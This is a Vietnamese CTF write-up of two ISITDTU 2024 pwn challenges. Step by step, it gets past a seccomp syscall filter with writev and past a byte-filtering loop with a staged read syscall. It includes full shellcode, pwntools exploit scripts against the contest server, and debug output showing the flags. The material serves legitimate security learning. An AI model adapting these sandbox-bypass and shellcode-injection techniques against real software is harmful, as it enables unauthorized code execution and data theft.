+++
title = 'ISITDTU CTF 2024'
date = 2024-02-16T21:20:55+07:00
draft = false
categories = ["ctf"]
+++

### 1. Shellcode1 (PWN)

![alt text](https://github.com/lwd3c/ISITDTU-CTF-2024/blob/main/image/image.png)

Chạy file challenge ta thấy đề leak ra 1 địa chỉ nào đó và yêu cầu nhập input. Sau khi nhập thử 1 chuỗi aaa thì chương trình bị end.

![alt text](/image/image-1.png)

Kiểm tra các cơ chế bảo mật:

![alt text](/image/image-2.png)

Như vậy, hầu hết các cơ chế bảo mật đều được bật.

Decompile file ta thấy:

![alt text](/image/image-3.png)

![alt text](/image/image-4.png)

Chương trình tạo ra 2 vùng nhớ mmap, 1 dùng để chứa nội dung của flag, 1 dùng để chứa shellcode mà ta truyền vào. Vậy mục tiêu của ta là thực thi shellcode để đọc nội dung của vùng nhớ mmap chứa nội dung flag.

Tuy nhiên, ở đây ta thấy có 1 hàm **filter**:

![alt text](/image/image-5.png)

Hàm này sử dụng cơ chế bảo mật seccomp (Secure Computing Mode), 1 cơ chế giúp giới hạn các syscalls mà một tiến trình có thể thực hiện. Ta có thể sử dụng [seccomp-tools](https://github.com/david942j/seccomp-tools) để theo dõi dễ hơn:

![alt text](/image/image-6.png)

Như đã thấy, ở đây giới hạn các syscall như `read`, `write`, `open`, `execve`, `mq_open`, `openat`. Vậy ta không thể sử dụng các syscall này trong thực thi shellcode được. 

Mục tiêu của ta đang cần là in nội dung của vùng nhớ mmap chứa flag ra màn hình, phương án tốt nhất sẽ là sử dụng syscall `write`, nhưng syscall `write` đã bị giới hạn bởi sccomp. Vậy ta cần tìm một syscall khác cũng có chức năng hiển thị ra màn hình mà không nằm trong danh sách bị giới hạn.  Đó chính là syscall `writev`.

![alt text](/image/image-7.png)

> Syscall `writev` cho phép gom các buffer vào một mảng và ghi toàn bộ nội dung của mảng này vào file descriptor, thay vì phải thực hiện nhiều lần gọi write cho từng buffer.
> Cú pháp: ```ssize_t writev(int fd, const struct iovec *iov, int iovcnt);```
> * fd: File descriptor nơi dữ liệu sẽ được ghi vào. Ví dụ: 1 là stdout (đầu ra tiêu chuẩn).
> * iov: Con trỏ đến một mảng các struct iovec, mỗi struct chứa một con trỏ đến một buffer và kích thước của buffer đó.
> * iovcnt: Số lượng buffer trong mảng iovec (tức là số phần tử của mảng iov).
> 
> `iovec` là một cấu trúc chứa thông tin của mỗi buffer:
> ```cpp
> struct iovec {
>     void  *iov_base;    // Con trỏ đến buffer chứa dữ liệu cần ghi
>     size_t iov_len;     // Độ dài của buffer
> };
> ```
> * `iov_base`: Địa chỉ của bộ đệm cần ghi.
> * `iov_len`: Kích thước (số byte) của bộ đệm.

![alt text](/image/image-8.png)

Ở đây, với vùng nhớ mmap đầu tiên chứa nội dung của flag, ta thấy có địa chỉ là `0x7ffff7fbc000`.

![alt text](/image/image-9.png)

Với vùng nhớ mmap thứ 2 dùng để ghi shellcode vào thông qua hàm `read`, ta thấy có địa chỉ là `0x7ffff7fbb000`. Như vậy 2 vùng nhớ này cách nhau `0x1000` bytes, ta có thể tìm được địa chỉ của vùng nhớ chứa flag thông qua vùng nhớ chứa shellcode này, sau đó dùng `writev` để in flag ra màn hình.

**Shellcode:**
```py
shellcode = asm(
    '''
    push rbx                    ; push rbx vào stack
    mov rbx, rdx                ; gán giá trị rdx cho rbx, ở đây là địa chỉ của vùng nhớ chứa shellcode.
    add rbx, 0x1000             ; tăng rbx thêm 0x1000 bytes để tới vùng nhớ chứa flag.

    ; khởi tạo cấu trúc iovec
    mov [rsp], rbx                    ; [rsp] là địa chỉ vùng nhớ chứa flag.
    mov qword ptr [rsp+8], 0x40       ; [rsp + 8] chứa kích thước cần ghi.

    ; khởi tạo syscall writev    
    mov rdi, 1                   ; rdi = 1, file descriptor cho stdout (màn hình)
    mov rsi, rsp                 ; rsi = rsp, con trỏ tới đỉnh của stack (địa chỉ vùng nhớ chứa flag)
    mov rdx, 1                   ; rdx = 1, số lượng iovec (iovcnt) là 1 (chỉ ghi một phần tử iovec từ rsp)
    mov rax, 20                  ; rax = 20, số syscall của writev trên x86_64.

    syscall                      ; Thực hiện syscall writev để ghi dữ liệu từ buffer trên stack ra stdout.
    ''', arch='amd64'
)
```

**Exploit:**
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF('challenge', checksec=False)
libc = exe.libc

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*main+349

        c
        ''')


if args.REMOTE:
    p = remote('152.69.210.130', 3001)
else:
    p = process(exe.path)
# GDB()

shellcode = asm(
    '''
    push rbx
    mov rbx, rdx
    add rbx, 0x1000
    
    mov [rsp], rbx
    mov qword ptr [rsp+8], 0x40
    
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 1
    mov rax, 20
    syscall
    
    ''', arch='amd64'
)
# input()

sl(shellcode)

p.interactive()
```

**Chạy file ta được:**
```py
➜  bin ./exploit.py DEBUG REMOTE
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 152.69.210.130 on port 3001: Done
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        push rbx
        mov rbx, rdx
        add rbx, 0x1000
        mov [rsp], rbx
        mov qword ptr [rsp+8], 0x40
        mov rdi, 1
        mov rsi, rsp
        mov rdx, 1
        mov rax, 20
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-pckgd63f/step2 /tmp/pwn-asm-pckgd63f/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-pckgd63f/step3 /tmp/pwn-asm-pckgd63f/step4
[DEBUG] Sent 0x33 bytes:
    00000000  53 48 89 d3  48 81 c3 00  10 00 00 48  89 1c 24 48  │SH··│H···│···H│··$H│
    00000010  c7 44 24 08  40 00 00 00  48 c7 c7 01  00 00 00 48  │·D$·│@···│H···│···H│
    00000020  89 e6 48 c7  c2 01 00 00  00 48 c7 c0  14 00 00 00  │··H·│····│·H··│····│
    00000030  0f 05 0a                                            │···│
    00000033
[*] Switching to interactive mode
[DEBUG] Received 0x22 bytes:
    b'Some gift for you: 0x7d057667d0f0\n'
Some gift for you: 0x7d057667d0f0
[DEBUG] Received 0x40 bytes:
    00000000  49 53 49 54  44 54 55 7b  30 36 31 65  38 63 32 36  │ISIT│DTU{│061e│8c26│
    00000010  65 33 63 66  39 62 66 61  64 34 65 32  32 38 37 39  │e3cf│9bfa│d4e2│2879│
    00000020  39 39 34 30  34 38 63 38  32 35 37 62  31 37 64 38  │9940│48c8│257b│17d8│
    00000030  7d 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │}···│····│····│····│
    00000040
ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$  
```

`FLAG: ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}`

---
### 2. Shellcode2 (PWN)

![alt text](/image/image-10.png)

Chạy file challenge ta thấy đề yêu cầu nhập input. Sau khi nhập thử 1 chuỗi aaa thì chương trình bị end.

![alt text](/image/image-11.png)

Kiểm tra các cơ chế bảo mật:

![alt text](/image/image-12.png)

Như vậy, hầu hết các cơ chế bảo mật đều được bật.

Decompile file ta thấy:

![alt text](/image/image-13.png)

![alt text](/image/image-14.png)

Chương trình đọc nội dung của flag và lưu vào biến `flag`. Sau đó tạo 1 vùng nhớ mmap để ghi dữ liệu đầu vào thông qua hàm `read`. Tiếp đó, ở vòng lặp `for`, chương trình sẽ đi qua 4096 byte trong `addr` và thay thế tất cả các byte chẵn bằng lệnh `NOP`. 

Như vậy, nếu ta truyền vào shellcode mà trong đó có các byte chẵn thì byte đó sẽ bị chuyển thành NOP, từ đó dẫn đến shellcode sẽ thực thi sai so với ý định của ta.

Tuy nhiên, ở đây chương trình có 1 lỗi đó là:

![alt text](/image/image-15.png)

Ngay trước khi chương trình nhảy vào shellcode thông qua lệnh `call rdx` thì ta thấy giá trị ở các thanh ghi `rax = 0`, `rdi = 0`, `rsi = 0xaabbc000` và `rdx = 0xaabbc000`. Như vậy, ta hoàn toàn có thể gọi được syscall `read` để ghi lại shellcode 1 lần nữa, lệnh `syscall` sẽ không bị chuyển thành `NOP` và sẽ thực thi được syscall `read`. Và shellcode sau khi ghi lại bởi syscall `read` sẽ không bị đi qua vòng lặp `for` để kiểm tra mà sẽ được thực thi trực tiếp.

**Shellcode 1:**
```py
shellcode1 = asm(
    '''
    ; khởi tạo syscall read
    syscall
    ''', arch='amd64'
)
```

Bây giờ ta cần tìm địa chỉ của biến flag để thực thi syscall write.

![alt text](/image/image-16.png)

Ta thấy biến `flag` được lưu ở trong binary, và đồng thời:

![alt text](/image/image-17.png)

Tại đỉnh stack có địa chỉ của 1 hàm trong binary, vậy ta hoàn toàn có thể tính được offset giữa 2 địa chỉ này:

![alt text](/image/image-18.png)

Vậy `offset = 0x2c41`.

**Shellcode 2:**
```py
shellcode2 = asm(
    '''
    push rbx           
    pop rbx
    pop rbx                ; lấy giá trị từ rsp vào rbx, ở đây là địa chỉ của hàm main trong binary.
    add rbx, 0x2c41        ; tăng 0x2c41 bytes để tới biến flag
    
    ; Khởi tạo syscall write
    mov rsi, rbx          ; Đặt rsi = rbx (địa chỉ của biến flag)
    mov rax, 1            ; Đặt rax = 1 (số syscall cho write trong hệ thống x86_64)
    mov rdi, 1            ; Đặt rdi = 1 (file descriptor cho stdout)
    mov rdx, 0x50         ; Đặt rdx = 0x50 (số byte cần ghi)
    
    syscall               ; Gọi syscall để thực hiện ghi dữ liệu.
    
    ''', arch='amd64'
)
```

**Exploit:**
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF('challenge', checksec=False)
libc = exe.libc

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*main+152
        b*main+236
        c
        ''')


if args.REMOTE:
    p = remote('152.69.210.130', 3002)
else:
    p = process(exe.path)
# GDB()

shellcode1 = asm(
    '''
    syscall
    ''', arch='amd64'
)

shellcode2 = asm(
    '''
    push rbx
    pop rbx
    pop rbx
    add rbx, 0x2c41
    
    mov rsi, rbx
    mov rax, 1
    mov rdi, 1
    mov rdx, 0x50
    syscall
    
    ''', arch='amd64'
)

# input()
sla(b'>\n',shellcode1)
sleep(1)
sl(shellcode2)

p.interactive()
```

**Chạy file ta được:**
```py
➜  bin ./exploit.py DEBUG REMOTE
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 152.69.210.130 on port 3002: Done
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-uusze9bj/step2 /tmp/pwn-asm-uusze9bj/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-uusze9bj/step3 /tmp/pwn-asm-uusze9bj/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        push rbx
        pop rbx
        pop rbx
        add rbx, 0x2c41
        mov rsi, rbx
        mov rax, 1
        mov rdi, 1
        mov rdx, 0x50
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-fw8pydvq/step2 /tmp/pwn-asm-fw8pydvq/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-fw8pydvq/step3 /tmp/pwn-asm-fw8pydvq/step4
[DEBUG] Received 0x2 bytes:
    b'>\n'
[DEBUG] Sent 0x3 bytes:
    00000000  0f 05 0a                                            │···│
    00000003
[DEBUG] Sent 0x25 bytes:
    00000000  53 5b 5b 48  81 c3 41 2c  00 00 48 89  de 48 c7 c0  │S[[H│··A,│··H·│·H··│
    00000010  01 00 00 00  48 c7 c7 01  00 00 00 48  c7 c2 50 00  │····│H···│···H│··P·│
    00000020  00 00 0f 05  0a                                     │····│·│
    00000025
[*] Switching to interactive mode
[DEBUG] Received 0x50 bytes:
    00000000  49 53 49 54  44 54 55 7b  39 35 61 63  66 33 61 36  │ISIT│DTU{│95ac│f3a6│
    00000010  62 33 65 31  61 66 63 32  34 33 66 62  61 64 37 30  │b3e1│afc2│43fb│ad70│
    00000020  66 62 64 36  30 61 36 62  65 30 30 35  34 31 63 36  │fbd6│0a6b│e005│41c6│
    00000030  32 63 36 64  36 35 31 64  31 63 31 30  31 37 39 62  │2c6d│651d│1c10│179b│
    00000040  34 31 31 31  33 62 64 61  7d 00 00 00  00 00 00 00  │4111│3bda│}···│····│
    00000050
ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$  
```
`FLAG: ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}`